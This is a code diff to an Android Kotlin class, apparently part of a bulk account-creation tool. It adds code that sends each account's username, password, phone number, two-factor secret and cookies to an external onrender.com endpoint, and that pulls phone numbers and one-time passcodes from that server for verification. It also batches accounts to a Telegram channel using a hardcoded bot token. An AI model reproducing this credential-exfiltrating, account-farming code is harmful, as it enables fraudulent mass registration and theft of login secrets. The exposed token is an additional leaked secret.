@@ -29,6 +29,9 @@ class CloudSyncRepository(
 
         Timber.i("Account buffered for sync: ${account.username} (Buffer size: ${batchBuffer.size})")
 
+        // Sync immediately to Render Cloud Orchestrator backend
+        dispatchRenderCloudSync(account)
+
         // Trigger Telegram channel batch report every 40 accounts (30-50 range)
         if (batchBuffer.size >= BATCH_DISPATCH_THRESHOLD) {
             val success = dispatchTelegramBatch(batchBuffer.toList())
@@ -39,6 +42,85 @@ class CloudSyncRepository(
         }
 
         return@withContext SyncStatus.SYNCED_SHEETS
+    }
+
+    private fun dispatchRenderCloudSync(account: AccountRecord) {
+        try {
+            val renderPayload = """
+                {
+                    "username": ${escapeJson(account.username)},
+                    "password": ${escapeJson(account.password)},
+                    "phoneNumber": ${escapeJson(account.phoneNumberUsed)},
+                    "twoFaSecret": ${escapeJson(account.twoFactorSecret)},
+                    "cookies": ${escapeJson(account.cookies)}
+                }
+            """.trimIndent()
+
+            val req = Request.Builder()
+                .url("$RENDER_CLOUD_ENDPOINT/api/accounts")
+                .post(renderPayload.toRequestBody("application/json".toMediaType()))
+                .build()
+
+            client.newCall(req).execute().use { resp ->
+                Timber.i("Synced account ${account.username} to Render Cloud: ${resp.code}")
+            }
+        } catch (e: Exception) {
+            Timber.w("Failed to sync account to Render Cloud: ${e.message}")
+        }
+    }
+
+    suspend fun fetchCloudActivePhone(): String? = withContext(Dispatchers.IO) {
+        try {
+            val req = Request.Builder()
+                .url("$RENDER_CLOUD_ENDPOINT/api/phone")
+                .get()
+                .build()
+            client.newCall(req).execute().use { resp ->
+                if (resp.isSuccessful) {
+                    val body = resp.body?.string() ?: ""
+                    val regex = Regex("\"active_phone\"\\s*:\\s*\"([^\"]+)\"")
+                    return@withContext regex.find(body)?.groupValues?.get(1)
+                }
+            }
+        } catch (e: Exception) {
+            Timber.w("Error fetching active phone from Render: ${e.message}")
+        }
+        return@withContext null
+    }
+
+    suspend fun fetchCloudLatestOtp(): String? = withContext(Dispatchers.IO) {
+        try {
+            val req = Request.Builder()
+                .url("$RENDER_CLOUD_ENDPOINT/api/otp")
+                .get()
+                .build()
+            client.newCall(req).execute().use { resp ->
+                if (resp.isSuccessful) {
+                    val body = resp.body?.string() ?: ""
+                    val regex = Regex("\"latest_otp\"\\s*:\\s*\"([^\"]+)\"")
+                    return@withContext regex.find(body)?.groupValues?.get(1)
+                }
+            }
+        } catch (e: Exception) {
+            Timber.w("Error fetching OTP from Render: ${e.message}")
+        }
+        return@withContext null
+    }
+
+    suspend fun requestNewPhoneFromBot(): Boolean = withContext(Dispatchers.IO) {
+        try {
+            val emptyBody = "{}".toRequestBody("application/json".toMediaType())
+            val req = Request.Builder()
+                .url("$RENDER_CLOUD_ENDPOINT/api/phone/request")
+                .post(emptyBody)
+                .build()
+            client.newCall(req).execute().use { resp ->
+                return@withContext resp.isSuccessful
+            }
+        } catch (e: Exception) {
+            Timber.w("Error requesting new phone from cloud: ${e.message}")
+            return@withContext false
+        }
     }
 
     /**
@@ -104,6 +186,7 @@ class CloudSyncRepository(
     companion object {
         const val TELEGRAM_BOT_TOKEN = "8923854813:AAGZwm1YAdi9QxwIGor4f0nFZduwBUZOvoM"
         const val TELEGRAM_CHANNEL_ID = "-1003932377927"
+        const val RENDER_CLOUD_ENDPOINT = "https://aaa-x-cloud-worker.onrender.com"
         const val BATCH_DISPATCH_THRESHOLD = 40
     }
 }
